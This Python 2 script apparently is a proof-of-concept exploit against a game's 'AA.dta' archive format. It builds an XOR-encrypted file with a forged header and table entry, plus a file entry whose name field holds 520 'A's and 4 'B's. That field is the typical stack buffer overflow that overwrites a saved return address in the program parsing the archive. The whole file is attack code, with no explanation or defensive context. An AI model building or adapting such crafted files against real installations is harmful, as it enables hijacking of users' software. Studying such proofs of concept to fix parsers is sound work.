import struct

# key for aa.dta file
key1 = 0xd4ad90c6 ^ 0x39475694
key2 = 0x67da216e ^ 0x34985762

# Signature 'ISD0'
signature = struct.pack("<I", 0x30445349)

SIZE_TABLEENTRY = 4 + 4 + 4 + 16

def cypher(buf, key1, key2):
	out = ""
	for i in xrange(0, len(buf) / 4, 2):
		out += struct.pack("<I", key1 ^ (struct.unpack("<I", buf[i * 4:(i + 1) * 4])[0]))
		if (len(buf[(i + 1) * 4:(i + 2) * 4]) != 4):
			break
		out += struct.pack("<I", key2 ^ (struct.unpack("<I", buf[(i + 1) * 4:(i + 2) * 4])[0]))
	return out

def craftdta():
	fdout = open("AA.dta", "wb")
	# SIGNATURE
	fdout.write(signature)

	# HEADER
	nbentry = struct.pack("<I", 0xCD7)
	offsettable = struct.pack("<I", 0x4 * 5)
	sizetable = struct.pack("<I", SIZE_TABLEENTRY * 1)
	unknow0C = struct.pack("<I", 0xFFDD6290)
	header = cypher(nbentry + offsettable + sizetable + unknow0C, key1, key2)
	fdout.write(header)

#TotalSum : 120527
#OffsetStart : 3C5F
#OffsetEnd : 3C91
#Name : BLES\EFFECTS.TBL
	

	# TableEntry
	totalsum = struct.pack("<I", 0x120527)
	offsetstart = struct.pack("<I", 0x4 * 5 + SIZE_TABLEENTRY * 1)
	offsetend = struct.pack("<I", 0x3C91)
	name = "BLES\EFFECTS.TBL"
	tableentry = cypher(totalsum + offsetstart + offsetend + name, key1, key2)
	fdout.write(tableentry)


	# PAYLOAD
	payload = "A" * 520 + "B" * 4

	# FileEntry
	Totalsize = struct.pack("<I", 0x0)
	unknow04 = struct.pack("<I", 0x0)
	unknow08 = struct.pack("<I", 0x0)
	unknow0C = struct.pack("<I", 0x0)
	filesize = struct.pack("<I", 0x1000)
	nbblock = struct.pack("<I", 0x0)
	Namelen = struct.pack("<I", len(payload))
	unknow1C = struct.pack("<I", 0)
	fileentry = cypher(Totalsize + unknow04 + unknow08 + unknow0C + filesize + nbblock + Namelen + unknow1C, key1, key2)
	fdout.write(fileentry)
	cyphpayload = cypher(payload, key1, key2)
	fdout.write(cyphpayload)
	fdout.close()

def main():
	craftdta()

if __name__ == '__main__':
	main()

